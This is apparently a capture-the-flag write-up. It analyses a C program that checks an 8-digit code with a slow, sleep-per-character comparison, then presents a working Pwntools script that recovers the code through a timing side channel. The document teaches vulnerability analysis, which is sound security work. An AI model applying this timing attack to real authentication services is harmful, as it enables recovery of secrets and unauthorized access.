# Writeup

## Analysis

Let's begin by reviewing the C source code for the challenge:

```c
int main(void) {
    // Disable buffering.
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    // Generate a random 8-digit code.
    char code[9];
    for (int i = 0; i < sizeof(code) - 1; i++) {
        do {
            getrandom(&code[i], sizeof(code[i]), 0);
        } while (code[i] < '0' || code[i] > '9');
    }
    code[sizeof(code) - 1] = '\x00';
```

The program starts by disabling buffering (standard stuff to make `socat` work smoothly) and then generates a random 8-digit code. This is done using `getrandom` and discarding characters that aren't between `0` and `9`. A null byte is added to the end to terminate the string.

`getrandom` is cryptographically secure and there is no distribution bias so the code is truly random.

```c
    // Load the flag.
    char flag[64];
    FILE *file = fopen("flag.txt", "r");
    fgets(flag, sizeof(flag), file);
    flag[strcspn(flag, "\r\n")] = '\x00';
    fclose(file);
```

Now the program loads the flag from `flag.txt` and removes any newline characters

```c
    char attempt[64];
    while (1) {
        printf("Enter the code: ");
        fgets(attempt, sizeof(attempt), stdin);
        attempt[strcspn(attempt, "\r\n")] = '\x00';

        if (strcmp_slow(code, attempt) == 0) {
            printf("Correct! Here is the flag: %s.\n", flag);
            break;
        } else {
            puts("Wrong :(");
        }
    }

    return 0;
}
```

The program then enters an infinite loop. It asks the user for the code and stores their input in `attempt`. `attempt` is then compared to `code` using `strcmp_slow`; if they are equal then the flag is outputted and the program exits, otherwise the loop continues.

Again, there doesn't seem to be any obvious vulnerability here. The `strcmp_slow` is custom however so perhaps the issue lies there:

```c
int strcmp_slow(char *str1, char *str2) {
    // A slow comparason to stop people brute-forcing.
    while (1) {
        sleep(1);

        if (*str1 != *str2) {
            return *str1 > *str2 ? 1 : -1;
        }

        if (*str1 == '\x00') {
            return 0;
        }

        str1++;
        str2++;
    }
}
```

This looks like a fairly generic `strcmp` implementation. Characters are compared until they are not equal, at which point `1` or `-1` is returned depending on which character is greater. If a null byte is reached before this point then a `0` is returned, indicating that the strings are equal.

The big difference here is that the program sleeps for a second every loop iteration which makes the program vulnerable to a timing attack. Say for example that the code is `12345678`. If you guessed `00000000` then there would be a 1 second delay in getting the response as the first characters don't match. If however you guessed `10000000`, the delay would be 2 seconds which reveals that we have got the first character correct. We can repeat this process to get all characters.

## Solution

We will be using `pwn.remote` from Pwntools to interact with the server. You can find more information about Pwntools in the `bof4` writeup.

Let's start by writing a function to time how long a code takes to process. To do this we just need to record the time, send the code, wait for a response and record the time again. The difference between the times give the processing time:

```python
def attempt(data):
    io.recvuntil("Enter the code: ")
    start = time()
    io.sendline(data)
    io.recvuntil("Wrong :(")
    return time() - start
```

Now we need to write a loop to work out the code. In each iteration we will first establish a threshold time by attempting the recovered digits plus a character that is definitely incorrect (a non-digit). Following this we will attempt every digit; if the time is more than half a second longer than the threshold then we know that the digit digit is correct and can add it to the known digits.

If we try every digit and none produce the required time then we have got the last digit wrong (due to dropped packets) and should remove it before starting the loop again. If we receive an EOF error then the program has exited so we can enter interactive mode to get the flag.

Here is the loop:

```python
code = ""
while True:
    threshold = attempt(code + "#") + 0.5
    for character in digits:
        try:
            if attempt(code + character) > threshold:
                code += character
                print(code)
                break
        except EOFError:
            io.interactive()
            exit()
    else:
        code = code[:-1]
        print(code)
```

In under 10 minutes the code is cracked and the flag is recovered.

The full script can be found in `solve.py`.
